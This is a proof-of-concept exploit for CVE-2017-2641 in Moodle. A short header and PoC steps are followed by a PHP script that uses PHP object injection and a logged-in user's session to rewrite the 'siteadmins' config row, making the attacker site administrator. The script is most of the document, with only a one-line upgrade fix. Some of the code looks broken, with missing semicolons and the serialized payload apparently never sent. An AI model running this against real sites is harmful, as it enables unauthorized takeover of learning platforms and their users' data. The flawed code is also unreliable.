# Date: April 6th, 2017
# Exploit Author: Marko Belzetski
# Contact: mbelzetski@protonmail.com
# Vendor Homepage: https://moodle.org/
# Version: 3.2 to 3.2.1, 3.1 to 3.1.4, 3.0 to 3.0.8, 2.7.0 to 2.7.18 and other unsupported versions
# Tested on: Moodle 3.2 running on php7.0 on Ubuntu 16.04
# CVE : CVE-2017-2641
 
1. Description
 
2. PoC
Log in as a regular user and note the URL of the Moodle site, the &#039;MoodleSession&#039; cookie value and the &#039;sesskey&#039; parameter along with your &#039;userid&#039; from the page source. Paste these values into the exploit script, fire the script, re-authenticate and you will be the site administrator.
 
<?php
 
//defining the required classes for our exploit
namespace gradereport_singleview\local\ui {
    class feedback{   
    }
}
 
namespace {
    class gradereport_overview_external{
}
 
class grade_item{
}
 
class grade_grade{
}
 
 
// creating a simple httpPost method which requires php-curl
function httpPost($url, $data, $MoodleSession, $json)
{
    $curl = curl_init($url);
    $headers = array(&#039;Cookie: MoodleSession=&#039;.$MoodleSession);
    if($json){
        array_push($headers, &#039;Content-Type: application/json&#039;);
    }else{
        $data =  urldecode(http_build_query($data));
    }
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    // curl_setopt($curl, CURLOPT_PROXY, &#039;127.0.0.1:8080&#039;); //un-comment if you wish to use a proxy
    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}
 
// creating a simple httpGet method which requires php-curl
function httpGet($url, $MoodleSession)
{
    $curl = curl_init($url);
    $headers = array(&#039;Cookie: MoodleSession=&#039;.$MoodleSession);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    // curl_setopt($curl, CURLOPT_PROXY, &#039;127.0.0.1:8080&#039;); //un-comment if you wish to use a proxy
    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}
 
function update_table($url, $MoodleSession, $sesskey, $table, $rowId, $column, $value){
    //first we create a gradereport_overview_external object because it is supported by the Moodle autoloader and it includes the grade_grade and grade_item classes that we are going to need
    $base = new gradereport_overview_external();
 
    // now we create the feedback object which inherits the vulnerable __tostring() method from its parent
    $fb = new gradereport_singleview\local\ui\feedback();
 
    //filling the feedback object with the required properties for the exploit to work
    $fb -> grade = new grade_grade();
    $fb -> grade -> grade_item = new grade_item();
    $fb -> grade -> grade_item -> calculation = "[[somestring";
    $fb -> grade -> grade_item -> calculation_normalized = false;
 
    //setting the table which we want to alter
    $fb -> grade -> grade_item -> table = $table;
    //setting the row id of the row that we want to alter
    $fb -> grade -> grade_item -> id = $rowId;
    //setting the column with the value that we want to insert
    $fb -> grade -> grade_item -> $column = $value;
    $fb -> grade -> grade_item -> required_fields = array($column,&#039;id&#039;);
     
    //creating the array with our base object (which itself is included in an array because the base object has no __tostring() method) and our payload object
    $arr = array(array($base),$fb);
     
    //serializing the array
    $value = serialize($arr);
 
    $data = array(&#039;sesskey&#039; => $sesskey, &#039;sortorder[]&#039; => 0);
    httpPost($url. &#039;/blocks/course_overview/save.php&#039;,$data, $MoodleSession,0);
 
    //injecting the payload
    httpPost($url.&#039;/lib/ajax/service.php?sesskey=&#039;.$sesskey, $data, $MoodleSession,1);
 
    //getting the frontpage so the payload will activate
    httpGet($url.&#039;/my/&#039;, $MoodleSession);
    }
 
$url = &#039;&#039;; //url of the Moodle site
$MoodleSession = &#039;&#039; //your MoodleSession cookie value
$sesskey = &#039;&#039;; //your sesskey
 
$table = "config"; //table to update 
$rowId = 25; // row id to insert into. 25 is the row that sets the &#039;siteadmins&#039; parameter. could vary from installation to installation
$column = &#039;value&#039;; //column name to update, which holds the userid
$value = 3; // userid to set as &#039;siteadmins&#039; Probably want to make it your own
 
update_table($url, $MoodleSession,$sesskey,$table,$rowId,$column, $value);
 
//reset the allversionshash config entry with a sha1 hash so the site reloads its configuration
$rowId = 375 // row id of &#039;allversionshash&#039; parameter
update_table($url, $MoodleSession,$sesskey,$table,$rowId, $column, sha1(time()));
 
//reset the sortorder so we can see the front page again without the payload triggering
$data = array(&#039;sesskey&#039; => $sesskey, &#039;sortorder[]&#039; => 1);
httpPost($url. &#039;/blocks/course_overview/save.php&#039;,$data, $MoodleSession,0);
 
//force plugincheck so we can access admin panel
httpGet($url.&#039;/admin/index.php?cache=0&confirmplugincheck=1&#039;,$MoodleSession);
 
}
?>
 
 
3. Solution:
Upgrade to fixed Moodle versions: 3.2.2, 3.1.5, 3.0.9 or 2.7.19

